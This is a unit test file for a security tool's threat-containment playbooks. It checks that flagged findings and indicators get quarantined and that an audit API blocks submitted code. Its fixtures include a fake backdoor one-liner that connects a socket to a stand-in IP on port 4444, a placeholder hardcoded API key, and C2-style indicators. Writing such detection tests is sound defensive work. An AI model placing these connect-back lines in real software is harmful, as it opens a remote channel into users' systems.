"""Unit tests for Cross-Agent Defense & Threat Containment Playbooks."""

import pytest
from httpx import ASGITransport, AsyncClient

from sentinel.apps.api.main import app
from sentinel.core.gateway.models import RiskLevel
from sentinel.core.incident.incident_manager import IncidentManager, IncidentState
from sentinel.core.incident.quarantine_manager import QuarantineCategory, QuarantineManager
from sentinel.core.playbooks.cross_agent_defense import (
    CrossAgentDefensePlaybook,
)
from sentinel.integrations.ecosystem.intelx_bridge import IntelXCoordinationBridge


@pytest.mark.asyncio
async def test_execute_audit_veto_containment_critical():
    inc_mgr = IncidentManager()
    quar_mgr = QuarantineManager()
    intelx_bridge = IntelXCoordinationBridge()

    playbook = CrossAgentDefensePlaybook(
        incident_mgr=inc_mgr,
        quarantine_mgr=quar_mgr,
        intelx_bridge=intelx_bridge,
    )

    findings = [
        {
            "rule_id": "NET-001",
            "severity": "CRITICAL",
            "title": "Raw Socket / Reverse Shell",
            "description": "Found backdoor socket.socket() connecting to 198.51.100.23:4444",
        },
        {
            "rule_id": "SECRET-OPENAI-KEY",
            "severity": "CRITICAL",
            "title": "Hardcoded OpenAI API Key",
            "description": "Detected raw OpenAI secret token sk-proj-1234567890abcdef",
        },
    ]

    report = await playbook.execute_audit_veto_containment(
        audit_id="aud-test-veto-01",
        task_id="tsk-forge-build-99",
        source_service="forge",
        operator="malicious_actor",
        findings=findings,
        declared_targets=["api.target.com"],
    )

    assert report.incident_id.startswith("inc-aud-test-veto-01")
    assert report.severity == "CRITICAL"
    assert report.status == "CONTAINED"
    assert report.trading_guard_engaged is True
    assert report.intelx_deconfliction_blocked is True
    assert len(report.contained_entities) >= 3

    # Verify Incident in IncidentManager
    incident = inc_mgr.get(report.incident_id)
    assert incident is not None
    assert incident.severity == RiskLevel.CRITICAL
    assert incident.state == IncidentState.CONTAINED

    # Verify Quarantines in QuarantineManager
    assert quar_mgr.is_quarantined("operator:malicious_actor") is True
    assert quar_mgr.is_quarantined("198.51.100.23") is True
    assert quar_mgr.is_quarantined("api.target.com") is True

    record = quar_mgr.get("198.51.100.23")
    assert record is not None
    assert record.category == QuarantineCategory.IP
    assert record.incident_id == report.incident_id


@pytest.mark.asyncio
async def test_execute_intelx_threat_containment():
    inc_mgr = IncidentManager()
    quar_mgr = QuarantineManager()
    intelx_bridge = IntelXCoordinationBridge()

    playbook = CrossAgentDefensePlaybook(
        incident_mgr=inc_mgr,
        quarantine_mgr=quar_mgr,
        intelx_bridge=intelx_bridge,
    )

    hostile_iocs = [
        {"value": "198.51.100.77", "type": "ip"},
        {"value": "c2-command.darkweb.onion", "type": "domain"},
    ]

    report = await playbook.execute_intelx_threat_containment(
        investigation_id="inv-intelx-threat-42",
        iocs=hostile_iocs,
    )

    assert report.incident_id == "inc-intelx-inv-intelx-threat-42"
    assert report.status == "CONTAINED"
    assert "198.51.100.77" in report.contained_entities
    assert "c2-command.darkweb.onion" in report.contained_entities

    # Verify quarantine
    assert quar_mgr.is_quarantined("198.51.100.77") is True
    assert quar_mgr.is_quarantined("c2-command.darkweb.onion") is True


@pytest.mark.asyncio
async def test_security_audit_api_triggers_defense_playbook_on_veto():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Submit audit payload with malicious code triggering VETO
        audit_payload = {
            "source_service": "forge",
            "task_id": "task-playbook-trigger",
            "operator": "rogue_dev",
            "files": {
                "backdoor.py": "import socket; s = socket.socket(); s.connect(('203.0.113.99', 4444));",
            },
        }

        resp = await client.post("/v1/security/audit", json=audit_payload)
        assert resp.status_code == 200
        data = resp.json()

        assert data["decision"] == "VETO"
        assert data["veto"] is True
        assert data["verdict"] == "BLOCKED"
        assert data["incident_id"] is not None
        assert data["playbook_status"] == "CONTAINED"
